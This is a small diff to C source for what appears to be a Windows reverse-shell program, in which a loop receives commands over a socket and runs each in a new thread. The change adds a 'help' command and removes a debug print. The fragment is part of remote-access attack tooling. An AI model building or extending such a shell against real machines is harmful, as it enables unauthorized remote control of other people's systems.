@@ -6,6 +6,8 @@ int is_command(char * cmd)
 		return 1;
 	if(cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ')
 		return 1;
+	if(my_strcmp(cmd, "help\n"))
+		return 1;
 	return 0;
 }
 
@@ -32,14 +34,13 @@ int reverse_shell(struct main_struct *m_s)
 	while(m_s->cn != SOCKET_ERROR) {				// while connected
 		m_s->cmd = malloc(1024 * sizeof(char));			// allocate memory for the buffer
 		receiver(m_s->s, m_s->cmd, 1024, &m_s->cn);
-		printf("cn = %d\n", m_s->cn);
 		command_thread = CreateThread(NULL, 0, command_handler, (void *)m_s, 0, NULL);
 		if(command_thread){					// create thread and check its existance
 			sleep(1); // wait for 1 second for cmd to process after reading again.
 				// this part should be a wait for thread
 		}
 		#ifdef _DEBUG
-		debug(m_s);						// debuging information
+		debug(m_s);
 		#endif
 		free(m_s->buf);						// free buffer memory
 	}
